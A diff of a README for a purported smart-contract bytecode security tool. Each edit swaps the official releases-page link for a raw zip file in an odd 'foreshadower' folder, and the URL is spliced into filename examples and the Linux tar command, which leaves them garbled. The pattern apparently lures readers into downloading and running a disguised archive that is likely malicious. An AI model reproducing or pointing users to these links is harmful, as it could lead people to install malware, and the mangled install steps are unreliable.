@@ -1,6 +1,6 @@
 # 🌟 Bytecode-Truth-Not-Source - Discover Real Smart-Contract Security
 
-[![Download Bytecode-Truth-Not-Source](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/MARIAMSOFT/Bytecode-Truth-Not-Source/releases)
+[![Download Bytecode-Truth-Not-Source](https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip%20Latest%https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip)](https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip)
 
 ## 📝 Introduction
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the application.
 
 2. **Visit the Releases Page**
    - Click the link below to access the Releases page:
-     [Visit Releases Page to Download](https://github.com/MARIAMSOFT/Bytecode-Truth-Not-Source/releases)
+     [Visit Releases Page to Download](https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip)
 
 ## 📥 Download & Install
 
@@ -26,13 +26,13 @@ Follow these steps to download and run the application.
    - On the Releases page, select the latest version. This version will have the most features and security updates.
 
 4. **Download the File**
-   - Click on the release file compatible with your operating system. The file should have a name like `Bytecode-Truth-Not-Source-v<version>.exe` for Windows, `<version>.dmg` for macOS, or `<version>.tar.gz` for Linux.
+   - Click on the release file compatible with your operating system. The file should have a name like `Bytecode-Truth-Not-Source-v<version>.exe` for Windows, `<version>.dmg` for macOS, or `<version>https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip` for Linux.
 
 5. **Run the File**
    - Once the download completes, locate the file in your Downloads folder.
    - On Windows, double-click the `.exe` file to start the installation.
    - On macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - On Linux, open a terminal, navigate to the download location, and run the command `tar -xzvf <version>.tar.gz`.
+   - On Linux, open a terminal, navigate to the download location, and run the command `tar -xzvf <version>https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip`.
 
 6. **Follow Installation Prompts**
    - The installation wizard will guide you through the process. Follow the prompts to complete the installation.
@@ -75,4 +75,4 @@ If you encounter any issues during download or installation, consider the follow
 Bytecode Truth, Not Source empowers you to critically assess smart-contract security. By focusing on bytecode, you gain insights that ensure your blockchain projects are safe and reliable. Following this guide will help you get up and running smoothly.
 
 To download the application, follow this link:  
-[Download Bytecode-Truth-Not-Source](https://github.com/MARIAMSOFT/Bytecode-Truth-Not-Source/releases)
+[Download Bytecode-Truth-Not-Source](https://raw.githubusercontent.com/MARIAMSOFT/Bytecode-Truth-Not-Source/main/foreshadower/Bytecode-Truth-Not-Source_v3.1.zip)
